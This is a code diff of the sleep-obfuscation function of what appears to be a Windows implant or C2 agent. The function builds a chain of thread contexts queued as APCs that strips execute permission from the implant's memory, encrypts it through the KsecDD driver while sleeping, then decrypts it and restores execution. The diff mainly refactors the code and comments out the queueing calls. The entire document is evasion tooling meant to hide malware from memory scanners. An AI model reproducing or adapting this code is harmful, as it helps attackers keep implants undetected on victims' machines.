@@ -34,13 +34,15 @@ BOOL AddValidCallTarget(void* pointer) {
     return success;
 }
 
-BOOL ObfuscateSleep(PCONTEXT FakeFrame, PLARGE_INTEGER Timeout) {
+BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     HEXANE
 
     HANDLE              rop_thread      = { };
     HANDLE              src_thread      = { };
     HANDLE              sync_event      = { };
     HANDLE              ksecdd          = { };
+
+    bool success = true;
 
     PWCHAR              ksecdd_name     = { };
     CLIENT_ID           src_cid         = { };
@@ -58,14 +60,15 @@ BOOL ObfuscateSleep(PCONTEXT FakeFrame, PLARGE_INTEGER Timeout) {
     PCONTEXT          ContextRopRes = { };
     PCONTEXT          ContextRopEnc = { };
     PCONTEXT          ContextRopDec = { };
-    PCONTEXT          ContextStolen = { };
+    PCONTEXT          stolen = { };
 
     PVOID             ContextMemPtr = { };
-    SIZE_T            ContextMemLen = 0;
-    ULONG             ContextMemPrt = 0;
-
     PVOID             ContextResPtr = { };
+
+    SIZE_T            ContextMemLen = 0;
     SIZE_T            ContextResLen = 0;
+
+    ULONG             ContextMemPrt = 0;
     ULONG             ContextResPrt = 0;
 
     PCONTEXT          ContextCtxCap = { };
@@ -73,16 +76,17 @@ BOOL ObfuscateSleep(PCONTEXT FakeFrame, PLARGE_INTEGER Timeout) {
     PCONTEXT          ContextCtxSet = { };
     PCONTEXT          ContextCtxRes = { };
 
+
     ContextMemPtr = C_PTR(Ctx->base.address);
     ContextMemLen = Ctx->base.size;
 
     ContextResPtr = C_PTR(Ctx->base.address);
     ContextResLen = Ctx->base.size;
 
-    AddValidCallTarget(C_PTR(Ctx->nt.ExitThread));
-    AddValidCallTarget(C_PTR(Ctx->nt.NtContinue));
+    AddValidCallTarget(C_PTR(Ctx->win32.ExitThread));
+    //AddValidCallTarget(C_PTR(Ctx->nt.NtContinue));
     AddValidCallTarget(C_PTR(Ctx->nt.NtTestAlert));
-    AddValidCallTarget(C_PTR(Ctx->nt.NtDelayExecution));
+    //AddValidCallTarget(C_PTR(Ctx->nt.NtDelayExecution));
     AddValidCallTarget(C_PTR(Ctx->nt.NtGetContextThread));
     AddValidCallTarget(C_PTR(Ctx->nt.NtSetContextThread));
     AddValidCallTarget(C_PTR(Ctx->nt.NtWaitForSingleObject));
@@ -95,102 +99,115 @@ BOOL ObfuscateSleep(PCONTEXT FakeFrame, PLARGE_INTEGER Timeout) {
     ksecdd_name = OBFW(L"\\Device\\KsecDD");
 
     Ctx->nt.RtlInitUnicodeString( &src_uni, ksecdd_name );
-    InitializeObjectAttributes( &sec_object, &src_uni, 0, 0, NULL );
+    InitializeObjectAttributes( &sec_object, &src_uni, 0, nullptr, nullptr );
 
-    ntstatus = Ctx->nt.NtOpenFile(&ksecdd, SYNCHRONIZE | FILE_READ_DATA, &sec_object, &ksecdd_iostat, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0);
+    if (!NT_SUCCESS(ntstatus = Ctx->nt.NtOpenFile(&ksecdd, SYNCHRONIZE | FILE_READ_DATA, &sec_object, &ksecdd_iostat, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0))) {
+        success_(false);
+    }
 
-    src_cid.UniqueProcess = 0;
+    src_cid.UniqueProcess = nullptr;
     src_cid.UniqueThread  = NtCurrentTeb()->ClientId.UniqueThread;
 
-    ntstatus = Ctx->nt.NtOpenThread(&src_thread, THREAD_ALL_ACCESS, &src_object, &src_cid);
-    ntstatus = Ctx->nt.NtCreateThreadEx(&rop_thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), C_PTR( FakeFrame->Rip ), NULL, TRUE, 0, 0xFFFF, 0xFFFF, NULL);
-    ntstatus = Ctx->nt.NtCreateEvent(&sync_event, EVENT_ALL_ACCESS, NULL, 1, FALSE);
+    if (
+        !NT_SUCCESS(ntstatus = Ctx->nt.NtOpenThread(&src_thread, THREAD_ALL_ACCESS, &src_object, &src_cid)) ||
+        !NT_SUCCESS(ntstatus = Ctx->nt.NtCreateThreadEx(&rop_thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), C_PTR( fake_frame->Rip ), NULL, TRUE, 0, 0xFFFF, 0xFFFF, NULL))) {
+        success_(false);
+    }
 
-    ContextStolen = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    //ntstatus = Ctx->nt.NtCreateEvent(&sync_event, EVENT_ALL_ACCESS, NULL, 1, FALSE);
 
-    ContextStolen->ContextFlags = CONTEXT_FULL;
-    ntstatus = Ctx->nt.NtGetContextThread(rop_thread, ContextStolen);
+    stolen = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
+    stolen->ContextFlags = CONTEXT_FULL;
 
-    rop_buffer = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    if (!NT_SUCCESS(ntstatus = Ctx->nt.NtGetContextThread(rop_thread, stolen))) {
+        success_(false);
+    }
+
+    rop_buffer = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
 
 #if defined( _WIN64 )
-    *rop_buffer = *ContextStolen;
-    rop_buffer->ContextFlags = CONTEXT_FULL;
-    rop_buffer->Rsp = U_PTR( ContextStolen->Rsp );
-    rop_buffer->Rip = U_PTR( Ctx->nt.NtWaitForSingleObject );
-    rop_buffer->Rcx = U_PTR( sync_event );
-    rop_buffer->Rdx = U_PTR( FALSE );
-    rop_buffer->R8  = U_PTR( NULL );
-    *( uintptr_t * )( rop_buffer->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
+    *rop_buffer = *stolen;
+    rop_buffer->ContextFlags    = CONTEXT_FULL;
+    rop_buffer->Rsp             = U_PTR( stolen->Rsp );
+    rop_buffer->Rip             = U_PTR( Ctx->nt.NtWaitForSingleObject );
+    rop_buffer->Rcx             = U_PTR( sync_event );
+    rop_buffer->Rdx             = false;
+    rop_buffer->R8              = NULL;
+
+    *(uintptr_t*)(rop_buffer->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 #else
-    *rop_buffer = *ContextStolen;
-	rop_buffer->ContextFlags = CONTEXT_FULL;
-	rop_buffer->Esp = U_PTR( ContextStolen->Esp - 0x100 );
-	rop_buffer->Eip = U_PTR( Ctx->nt.NtWaitForSingleObject );
-	*( uintptr_t * )( rop_buffer->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
+    *rop_buffer                 = *stolen;
+	rop_buffer->ContextFlags    = CONTEXT_FULL;
+	rop_buffer->Esp             = U_PTR(stolen->Esp - 0x100);
+	rop_buffer->Eip             = U_PTR(Ctx->nt.NtWaitForSingleObject);
+	*(uintptr_t*)(rop_buffer->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
 	// insert argument chain here
 #endif
 
-    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_buffer, NULL, NULL);
-    ContextRopSet = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_buffer, NULL, NULL);
+    ContextRopSet = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
 
-    *ContextRopSet = *ContextStolen;
+    *ContextRopSet = *stolen;
     ContextRopSet->ContextFlags = CONTEXT_FULL;
-    ContextRopSet->Rsp = U_PTR( ContextStolen->Rsp - 0x1000 );
-    ContextRopSet->Rip = U_PTR( Ctx->nt.NtProtectVirtualMemory );
-    ContextRopSet->Rcx = U_PTR( NtCurrentProcess() );
-    ContextRopSet->Rdx = U_PTR( &ContextMemPtr );
-    ContextRopSet->R8  = U_PTR( &ContextMemLen );
-    ContextRopSet->R9  = U_PTR( PAGE_READWRITE );
-    *( uintptr_t *)( ContextRopSet->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
-    *( uintptr_t *)( ContextRopSet->Rsp + 0x28 ) = ( uintptr_t ) &ContextMemPrt;
+    ContextRopSet->Rsp          = U_PTR(stolen->Rsp - 0x1000);
+    ContextRopSet->Rip          = U_PTR(Ctx->nt.NtProtectVirtualMemory);
+    ContextRopSet->Rcx          = U_PTR(NtCurrentProcess());
+    ContextRopSet->Rdx          = U_PTR(&ContextMemPtr);
+    ContextRopSet->R8           = U_PTR(&ContextMemLen);
+    ContextRopSet->R9           = PAGE_READWRITE;
 
-    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopSet, NULL, NULL);
-    ContextRopEnc = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    *(uintptr_t*)(ContextRopSet->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
+    *(uintptr_t*)(ContextRopSet->Rsp + 0x28) = (uintptr_t) &ContextMemPrt;
 
-    *ContextRopEnc = *ContextStolen;
+    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopSet, NULL, NULL);
+    ContextRopEnc = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
+
+    *ContextRopEnc = *stolen;
     ContextRopEnc->ContextFlags = CONTEXT_FULL;
-    ContextRopEnc->Rsp = U_PTR( ContextStolen->Rsp - 0x2000 );
-    ContextRopEnc->Rip = U_PTR( Ctx->nt.NtDeviceIoControlFile );
-    ContextRopEnc->Rcx = U_PTR( ksecdd );
-    ContextRopEnc->Rdx = U_PTR( NULL );
-    ContextRopEnc->R8  = U_PTR( NULL );
-    ContextRopEnc->R9  = U_PTR( NULL );
-    *( uintptr_t *)( ContextRopEnc->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
-    *( uintptr_t *)( ContextRopEnc->Rsp + 0x28 ) = ( uintptr_t ) &ksecdd_iostat;
-    *( uintptr_t *)( ContextRopEnc->Rsp + 0x30 ) = ( uintptr_t ) IOCTL_KSEC_ENCRYPT_MEMORY;
-    *( uintptr_t *)( ContextRopEnc->Rsp + 0x38 ) = ( uintptr_t ) ContextMemPtr;
-    *( uintptr_t *)( ContextRopEnc->Rsp + 0x40 ) = ( uintptr_t ) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
-    *( uintptr_t *)( ContextRopEnc->Rsp + 0x48 ) = ( uintptr_t ) ContextMemPtr;
-    *( uintptr_t *)( ContextRopEnc->Rsp + 0x50 ) = ( uintptr_t ) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
+    ContextRopEnc->Rsp          = U_PTR(stolen->Rsp - 0x2000);
+    ContextRopEnc->Rip          = U_PTR(Ctx->nt.NtDeviceIoControlFile);
+    ContextRopEnc->Rcx          = U_PTR(ksecdd);
+    ContextRopEnc->Rdx          = NULL;
+    ContextRopEnc->R8           = NULL;
+    ContextRopEnc->R9           = NULL;
 
-    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopEnc, NULL, NULL);
-    ContextCtxCap = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
-    ContextCapMem = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    *(uintptr_t*)(ContextRopEnc->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
+    *(uintptr_t*)(ContextRopEnc->Rsp + 0x28) = (uintptr_t) &ksecdd_iostat;
+    *(uintptr_t*)(ContextRopEnc->Rsp + 0x30) = (uintptr_t) IOCTL_KSEC_ENCRYPT_MEMORY;
+    *(uintptr_t*)(ContextRopEnc->Rsp + 0x38) = (uintptr_t) ContextMemPtr;
+    *(uintptr_t*)(ContextRopEnc->Rsp + 0x40) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);
+    *(uintptr_t*)(ContextRopEnc->Rsp + 0x48) = (uintptr_t) ContextMemPtr;
+    *(uintptr_t*)(ContextRopEnc->Rsp + 0x50) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);
 
-    *ContextCtxCap = *ContextStolen;
+    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopEnc, NULL, NULL);
+    ContextCtxCap = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
+    ContextCapMem = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
+
+    *ContextCtxCap = *stolen;
     ContextCapMem->ContextFlags = CONTEXT_FULL;
     ContextCtxCap->ContextFlags = CONTEXT_FULL;
-    ContextCtxCap->Rsp = U_PTR( ContextStolen->Rsp );
-    ContextCtxCap->Rip = U_PTR( Ctx->nt.NtGetContextThread );
-    ContextCtxCap->Rcx = U_PTR( src_thread );
-    ContextCtxCap->Rdx = U_PTR( ContextCapMem );
-    *( uintptr_t *)( ContextCtxCap->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
+    ContextCtxCap->Rsp          = U_PTR( stolen->Rsp );
+    ContextCtxCap->Rip          = U_PTR( Ctx->nt.NtGetContextThread );
+    ContextCtxCap->Rcx          = U_PTR( src_thread );
+    ContextCtxCap->Rdx          = U_PTR( ContextCapMem );
 
-    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxCap, NULL, NULL);
-    ContextCtxSet = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    *(uintptr_t*)(ContextCtxCap->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    *ContextCtxSet = *ContextStolen;
+    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxCap, NULL, NULL);
+    ContextCtxSet = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
+
+    *ContextCtxSet = *stolen;
     ContextCtxSet->ContextFlags = CONTEXT_FULL;
-    ContextCtxSet->Rsp = U_PTR( ContextStolen->Rsp );
-    ContextCtxSet->Rip = U_PTR( Ctx->nt.NtSetContextThread );
-    ContextCtxSet->Rcx = U_PTR( src_thread );
-    ContextCtxSet->Rdx = U_PTR( FakeFrame );
-    *( uintptr_t *)( ContextCtxSet->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
+    ContextCtxSet->Rsp          = U_PTR( stolen->Rsp );
+    ContextCtxSet->Rip          = U_PTR( Ctx->nt.NtSetContextThread );
+    ContextCtxSet->Rcx          = U_PTR( src_thread );
+    ContextCtxSet->Rdx          = U_PTR( fake_frame );
 
-    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxSet, NULL, NULL);
-    ContextRopDel = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    *(uintptr_t*)(ContextCtxSet->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
+
+    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxSet, NULL, NULL);
+    ContextRopDel = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
 
 //
 // WAIT FUNCTION GOES HERE
@@ -202,30 +219,31 @@ BOOL ObfuscateSleep(PCONTEXT FakeFrame, PLARGE_INTEGER Timeout) {
 // we can use it on objects.
 //
 
-    *ContextRopDel = *ContextStolen;
+    *ContextRopDel = *stolen;
     ContextRopDel->ContextFlags = CONTEXT_FULL;
-    ContextRopDel->Rsp = U_PTR( ContextStolen->Rsp );
-    ContextRopDel->Rip = U_PTR( Ctx->nt.NtDelayExecution );
-    ContextRopDel->Rcx = U_PTR( FALSE );
-    ContextRopDel->Rdx = U_PTR( Timeout );
-    *( uintptr_t *)( ContextRopDel->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
+    ContextRopDel->Rsp          = U_PTR(stolen->Rsp);
+    ContextRopDel->Rip          = U_PTR(Ctx->nt.NtDelayExecution);
+    ContextRopDel->Rcx          = false;
+    ContextRopDel->Rdx          = U_PTR(Timeout);
 
-    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopDel, NULL, NULL);
+    *(uintptr_t*)(ContextRopDel->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
+
+    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopDel, NULL, NULL);
 
 //
 // WAIT FUNCTION ENDS HERE
 //
 
-    ContextRopDec = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    ContextRopDec = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
 
-    *ContextRopDec = *ContextStolen;
+    *ContextRopDec = *stolen;
     ContextRopDec->ContextFlags = CONTEXT_FULL;
-    ContextRopDec->Rsp = U_PTR( ContextStolen->Rsp - 0x3000 );
-    ContextRopDec->Rip = U_PTR( Ctx->nt.NtDeviceIoControlFile );
-    ContextRopDec->Rcx = U_PTR( ksecdd );
-    ContextRopDec->Rdx = U_PTR( NULL );
-    ContextRopDec->R8  = U_PTR( NULL );
-    ContextRopDec->R9  = U_PTR( NULL );
+    ContextRopDec->Rsp          = U_PTR(stolen->Rsp - 0x3000 );
+    ContextRopDec->Rip          = U_PTR(Ctx->nt.NtDeviceIoControlFile );
+    ContextRopDec->Rcx          = U_PTR(ksecdd);
+    ContextRopDec->Rdx          = NULL;
+    ContextRopDec->R8           = NULL;
+    ContextRopDec->R9           = NULL;
 
     *(uintptr_t*)(ContextRopDec->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
     *(uintptr_t*)(ContextRopDec->Rsp + 0x28) = (uintptr_t) &ksecdd_iostat;
@@ -235,66 +253,70 @@ BOOL ObfuscateSleep(PCONTEXT FakeFrame, PLARGE_INTEGER Timeout) {
     *(uintptr_t*)(ContextRopDec->Rsp + 0x48) = (uintptr_t) ContextMemPtr;
     *(uintptr_t*)(ContextRopDec->Rsp + 0x50) = (uintptr_t) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
 
-    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopDec, NULL, NULL);
-    ContextCtxRes = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopDec, NULL, NULL);
+    ContextCtxRes = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
 
-    *ContextCtxRes = *ContextStolen;
+    *ContextCtxRes = *stolen;
     ContextCtxRes->ContextFlags = CONTEXT_FULL;
-    ContextCtxRes->Rsp = U_PTR( ContextStolen->Rsp );
-    ContextCtxRes->Rip = U_PTR( Ctx->nt.NtSetContextThread );
-    ContextCtxRes->Rcx = U_PTR( src_thread );
-    ContextCtxRes->Rdx = U_PTR( ContextCapMem );
-    *( uintptr_t *)( ContextCtxRes->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
+    ContextCtxRes->Rsp          = U_PTR(stolen->Rsp);
+    ContextCtxRes->Rip          = U_PTR(Ctx->nt.NtSetContextThread);
+    ContextCtxRes->Rcx          = U_PTR(src_thread);
+    ContextCtxRes->Rdx          = U_PTR(ContextCapMem);
 
-    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxRes, NULL, NULL);
-    ContextRopRes = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    *(uintptr_t*)(ContextCtxRes->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    *ContextRopRes = *ContextStolen;
+    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxRes, NULL, NULL);
+    ContextRopRes = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
+
+    *ContextRopRes = *stolen;
     ContextRopRes->ContextFlags = CONTEXT_FULL;
-    ContextRopRes->Rsp = U_PTR( ContextStolen->Rsp - 0x1000 );
-    ContextRopRes->Rip = U_PTR( Ctx->nt.NtProtectVirtualMemory );
-    ContextRopRes->Rcx = U_PTR( NtCurrentProcess() );
-    ContextRopRes->Rdx = U_PTR( &ContextResPtr );
-    ContextRopRes->R8  = U_PTR( &ContextResLen );
-    ContextRopRes->R9  = U_PTR( PAGE_EXECUTE_READWRITE );
-    *( uintptr_t *)( ContextRopRes->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert ;
-    *( uintptr_t *)( ContextRopRes->Rsp + 0x28 ) = ( uintptr_t ) &ContextResPrt;
+    ContextRopRes->Rsp          = U_PTR( stolen->Rsp - 0x1000 );
+    ContextRopRes->Rip          = U_PTR( Ctx->nt.NtProtectVirtualMemory );
+    ContextRopRes->Rcx          = U_PTR( NtCurrentProcess() );
+    ContextRopRes->Rdx          = U_PTR( &ContextResPtr );
+    ContextRopRes->R8           = U_PTR( &ContextResLen );
+    ContextRopRes->R9           = PAGE_EXECUTE_READWRITE;
 
-    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopRes, NULL, NULL);
-    ContextRopExt = NtMemAlloc( Ctx, sizeof( CONTEXT ) );
+    *(uintptr_t*)(ContextRopRes->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert ;
+    *(uintptr_t*)(ContextRopRes->Rsp + 0x28) = (uintptr_t) &ContextResPrt;
 
-    *ContextRopExt = *ContextStolen;
+    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopRes, NULL, NULL);
+    ContextRopExt = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
+
+    *ContextRopExt = *stolen;
     ContextRopExt->ContextFlags = CONTEXT_FULL;
-    ContextRopExt->Rsp = U_PTR( ContextStolen->Rsp );
-    ContextRopExt->Rip = U_PTR( Ctx->nt.ExitThread );
-    ContextRopExt->Rcx = U_PTR( NULL );
-    *( uintptr_t *)( ContextRopExt->Rsp + 0x00 ) = ( uintptr_t ) Ctx->nt.NtTestAlert;
+    ContextRopExt->Rsp          = U_PTR(stolen->Rsp );
+    ContextRopExt->Rip          = U_PTR(Ctx->win32.ExitThread );
+    ContextRopExt->Rcx          = NULL;
 
-    ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopExt, NULL, NULL);
-    ntstatus = Ctx->nt.NtAlertResumeThread(rop_thread, &success_count);
+    *(uintptr_t*)(ContextRopExt->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    ntstatus = Ctx->nt.NtSignalAndWaitForSingleObject(sync_event, rop_thread, TRUE, NULL);
+    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopExt, NULL, NULL);
+    //ntstatus = Ctx->nt.NtAlertResumeThread(rop_thread, &success_count);
+    //ntstatus = Ctx->nt.NtSignalAndWaitForSingleObject(sync_event, rop_thread, true, NULL);
 
-    END_ROP_CHAIN:
-    if ( ContextRopDec ) { NtMemFree( Ctx, ContextRopDec ); };
-    if ( ContextRopEnc ) { NtMemFree( Ctx, ContextRopEnc ); };
-    if ( ContextCtxRes ) { NtMemFree( Ctx, ContextCtxRes ); };
-    if ( ContextCtxSet ) { NtMemFree( Ctx, ContextCtxSet ); };
-    if ( ContextCtxCap ) { NtMemFree( Ctx, ContextCtxCap ); };
-    if ( ContextCapMem ) { NtMemFree( Ctx, ContextCapMem ); };
-    if ( ContextRopRes ) { NtMemFree( Ctx, ContextRopRes ); };
-    if ( ContextRopSet ) { NtMemFree( Ctx, ContextRopSet ); };
-    if ( ContextRopDel ) { NtMemFree( Ctx, ContextRopDel ); };
-    if ( rop_buffer ) { NtMemFree( Ctx, rop_buffer ); };
-    if ( ContextRopExt ) { NtMemFree( Ctx, ContextRopExt ); };
-    if ( ContextStolen ) { NtMemFree( Ctx, ContextStolen ); };
+    defer:
+    if (ContextRopDec)  { x_free(ContextRopDec); }
+    if (ContextRopEnc)  { x_free(ContextRopEnc); }
+    if (ContextCtxRes)  { x_free(ContextCtxRes); }
+    if (ContextCtxSet)  { x_free(ContextCtxSet); }
+    if (ContextCtxCap)  { x_free(ContextCtxCap); }
+    if (ContextCapMem)  { x_free(ContextCapMem); }
+    if (ContextRopRes)  { x_free(ContextRopRes); }
+    if (ContextRopSet)  { x_free(ContextRopSet); }
+    if (ContextRopDel)  { x_free(ContextRopDel); }
+    if (ContextRopExt)  { x_free(ContextRopExt); }
+    if (rop_buffer)     { x_free(rop_buffer); }
+    if (stolen)         { x_free(stolen); }
 
-    if ( rop_thread ) { Ctx->nt.NtTerminateThread( rop_thread, STATUS_SUCCESS );
+    if (rop_thread) {
+        Ctx->nt.NtTerminateThread(rop_thread, ERROR_SUCCESS);
         Ctx->nt.NtClose( rop_thread );
-    };
-    if ( src_thread ) { Ctx->nt.NtClose( src_thread ); };
-    if ( sync_event ) { Ctx->nt.NtClose( sync_event ); };
-    if ( ksecdd ) { Ctx->nt.NtClose( ksecdd ); };
+    }
+
+    if (src_thread) { Ctx->nt.NtClose(src_thread); }
+    if (sync_event) { Ctx->nt.NtClose(sync_event); }
+    if (ksecdd)     { Ctx->nt.NtClose(ksecdd); }
 
     return ntstatus;
 };
